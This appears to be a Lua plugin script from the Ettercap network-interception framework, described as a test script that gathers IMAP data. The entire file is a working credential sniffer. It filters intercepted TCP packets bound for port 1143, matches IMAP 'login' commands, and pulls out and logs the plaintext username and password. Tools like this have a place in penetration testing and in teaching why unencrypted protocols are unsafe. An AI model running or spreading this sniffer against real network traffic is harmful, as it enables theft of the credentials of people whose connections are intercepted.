---
--
-- Created by Ryan Linn and Mike Ryan
-- Copyright (C) 2012 Trustwave Holdings, Inc.

description = "This is a test script to gather imap data";

require 'os'
local ffi = require('ettercap_ffi')
local hook_points = require("hook_points")
local shortpacket = require("shortpacket")
local shortsession = require("shortsession")
local packet = require("packet")

hook_point = hook_points.filter

packetrule = function(packet_object)
  if packet.is_tcp(packet_object) == false then
    return false
  end

  local dst_port = ffi.C.ntohs(packet_object.L4.dst)
  
  if not( dst_port == 1143) then
	return false
  end

  -- Check to see if it starts with the right stuff.
  return true
end


-- Here's your action.
action = function(packet_object) 
  local buf = packet.read_data(packet_object)
  if string.match(buf,"login") then
	user,password = string.match(buf,"login \"(%S+)\" \"(%S+)\"")
        ettercap.log("Got IMAP User %s:%s\n",user,password)
  end
end
